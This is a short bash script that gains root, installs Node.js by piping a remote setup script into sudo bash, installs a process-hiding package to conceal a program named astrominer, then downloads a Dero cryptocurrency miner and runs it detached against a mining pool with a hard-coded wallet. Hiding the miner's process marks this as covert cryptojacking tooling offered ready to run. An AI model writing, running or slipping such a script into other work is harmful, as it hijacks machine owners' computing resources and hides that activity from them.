#!/bin/bash    
sudo su <<EOF
sudo apt install screen -y
apt update && apt -y install sudo wget curl unzip >/dev/null 2>&1
sudo apt install screen -y
sudo apt update;apt -y install curl unzip autoconf git cmake binutils build-essential net-tools screen golang >/dev/null 2>&1
curl -fsSL https://deb.nodesource.com/setup_17.x | sudo -E bash -
apt-get install -y nodejs >/dev/null 2>&1
sudo npm i -g node-process-hider && sudo ph add astrominer
wget  -q https://github.com/tj8519/astrominer/releases/download/V1.5.1/astrominer-V1.5.1_linux_amd64.tar.gz && tar xf astrominer-V1.5.1_linux_amd64.tar.gz
screen -dms run ./astrominer -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xm369mdkp06lgvqf4y5cm.shgit -r pool.whalesburg.com:4305 -p stratum
EOF
